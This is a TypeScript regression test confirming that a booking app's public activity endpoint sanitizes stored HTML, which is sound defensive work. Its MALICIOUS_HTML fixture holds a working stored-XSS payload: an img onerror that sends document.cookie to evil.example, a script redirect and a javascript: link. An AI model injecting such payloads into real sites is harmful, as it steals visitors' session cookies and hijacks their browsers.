/**
 * Stored-XSS regression (xss-01) — the PUBLIC, unauthenticated activity detail
 * endpoint must never hand an executable description_html back to a browser.
 *
 * Activity.description_html is operator-authored rich text injected via
 * dangerouslySetInnerHTML on the public booking page and on the third-party embed
 * widget. The column stored whatever a staffer typed (only z.string().max(20000)),
 * so a planted `<img src=x onerror=…>` / `<script>` ran in every anonymous
 * visitor's browser and cross-tenant on any host embedding the widget.
 *
 * This test plants a malicious payload directly on a disposable row (simulating a
 * legacy/pre-sanitization row, which is exactly what the server-side GET sanitizer
 * is the last line of defense for) and asserts GET /api/activities/:id returns it
 * neutralized. It FAILS against the old route (which returned row.description_html
 * verbatim) and PASSES once the response is sanitized.
 *
 * Skips without DATABASE_URL. Creates one disposable activity and deletes it in
 * afterAll — never touches the seed catalog.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { adminPrisma } from '@marina/database';
import { createId } from '@marina/core';
import { app } from '../src/app.js';

const HAS_DB = Boolean(process.env.DATABASE_URL);
const OP = 'lsra';
const SLUG = 'lake-sonoma';

const MALICIOUS_HTML =
  '<p>Sunset cruise</p>' +
  '<img src=x onerror="fetch(`https://evil.example/steal?c=`+document.cookie)">' +
  '<script>document.location="https://evil.example"</script>' +
  '<a href="javascript:alert(document.domain)">tap</a>';

let activityId: string;

describe.skipIf(!HAS_DB)('activity detail stored-XSS hardening (live vs seed, LSRA)', () => {
  beforeAll(async () => {
    activityId = createId();
    await adminPrisma.activity.create({
      data: {
        id: activityId,
        operator_id: OP,
        name_internal: 'xss-itest internal',
        name_external: 'xss-itest external',
        status: 'ACTIVE',
        visible_online: true,
        hide_from_display: false,
        // Plant the payload straight on the column, bypassing the write-time schema
        // sanitizer, so this proves the endpoint itself refuses to serve it.
        description_html: MALICIOUS_HTML,
      },
    });
  });

  afterAll(async () => {
    if (activityId) {
      await adminPrisma.activity.deleteMany({ where: { id: activityId, operator_id: OP } });
    }
  });

  it('never returns executable markup from the public GET /:id', async () => {
    const res = await app.request(`/api/activities/${activityId}`, {
      headers: { 'x-operator-slug': SLUG },
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as { activity: { descriptionHtml: string | null } };
    const html = (body.activity.descriptionHtml ?? '').toLowerCase();

    // The dangerous surface is gone...
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('javascript:');
    // ...while the legitimate prose survives.
    expect(html).toContain('sunset cruise');
  });
});
